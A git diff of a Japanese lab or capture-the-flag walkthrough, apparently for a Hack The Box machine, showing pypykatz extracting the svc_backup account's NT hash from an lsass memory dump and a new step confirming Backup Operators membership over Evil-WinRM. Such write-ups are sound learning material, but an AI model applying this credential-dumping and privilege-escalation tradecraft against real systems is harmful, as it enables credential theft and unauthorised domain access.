@@ -222,7 +222,7 @@ smb://10.129.194.101/forensic/memory_analysis/lsass.zip
                 
 Downloaded 39.99MB in 1961 seconds
 ```
-windows上のmimikatzでも可能だが、今回はpython製のpypykatzを使用
+windows上のmimikatzでも可能だが、今回はpython製のpypykatzを使用  
 svc_backupのNTハッシュを取得
 ```sh
 └─$ pypykatz lsa minidump lsass.DMP -p msv       
@@ -293,4 +293,27 @@ luid 153705
                 NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                 SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                 DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
+```
+
+
+## STPE 5
+`Backup Operators`に所属していることを確認
+```sh
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
